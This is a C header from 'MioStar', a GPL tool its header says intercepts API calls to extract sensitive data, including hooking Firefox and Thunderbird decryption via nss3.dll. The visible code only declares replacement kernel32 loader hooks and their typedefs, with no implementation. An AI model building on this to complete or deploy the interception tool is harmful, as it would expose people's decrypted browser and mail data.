/*
 * Tool name   : MioStar
 * Description : Tool to intercept API calls and to extract sensitive data.
 * Version     : 0.2
 * Date        : 11.17.2010
 * Author      : Ruben Unteregger
 * Web page    : http://www.megapanzer.com
 * Todo        : 
 * Changes     : 11.17.2010 nss3.dll to intercept Firefox, Thunderbird + Seamonkey crypt/decrypt calls
 *
 *
 * License     :
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 *
 */






#include <windows.h>


#ifndef _KERNEL32REPLACEMENT_H
#define _KERNEL32REPLACEMENT_H

HMODULE WINAPI MyLoadLibraryA(LPCSTR lpFileName);
HMODULE WINAPI MyLoadLibraryW(LPCWSTR lpFileName);
HMODULE WINAPI MyLoadLibraryExA(LPCSTR lpFileName, HANDLE hFile, DWORD dwFlags);
HMODULE WINAPI MyLoadLibraryExW(LPCWSTR lpFileName, HANDLE hFile, DWORD dwFlags);
HMODULE WINAPI MyGetModuleHandleA(LPCSTR lpModuleName);
HMODULE WINAPI MyGetModuleHandleW(LPCWSTR lpModuleName);
BOOL WINAPI MyGetModuleHandleExA(DWORD dwFlags, LPCSTR lpModuleName, HMODULE *phModule);
BOOL WINAPI MyGetModuleHandleExW(DWORD dwFlags, LPCWSTR lpModuleName, HMODULE *phModule);
FARPROC WINAPI MyGetProcAddress(HMODULE hModule, LPCSTR lpProcName);
BOOL WINAPI MyFreeLibrary(HMODULE hModule);

typedef HMODULE (WINAPI *MYLOADLIBRARYA)(LPCSTR lpFileName);
typedef HMODULE (WINAPI *MYLOADLIBRARYW)(LPCWSTR lpFileName);
typedef HMODULE (WINAPI *MYLOADLIBRARYEXA)(LPCSTR lpFileName, HANDLE hFile, DWORD dwFlags);
typedef HMODULE (WINAPI *MYLOADLIBRARYEXW)(LPCWSTR lpFileName, HANDLE hFile, DWORD dwFlags);
typedef HMODULE (WINAPI *MYGETMODULEHANDLEA)(LPCSTR lpModuleName);
typedef HMODULE (WINAPI *MYGETMODULEHANDLEW)(LPCWSTR lpModuleName);
typedef BOOL (WINAPI *MYGETMODULEHANDLEEXA)(DWORD dwFlags, LPCSTR lpModuleName, HMODULE *phModule);
typedef BOOL (WINAPI *MYGETMODULEHANDLEEXW)(DWORD dwFlags, LPCWSTR lpModuleName, HMODULE *phModule);
typedef FARPROC (WINAPI *MYGETPROCADDRESS)(HMODULE hModule, LPCSTR lpProcName);
typedef BOOL (WINAPI *MYFREELIBRARY)(HMODULE hModule);
#endif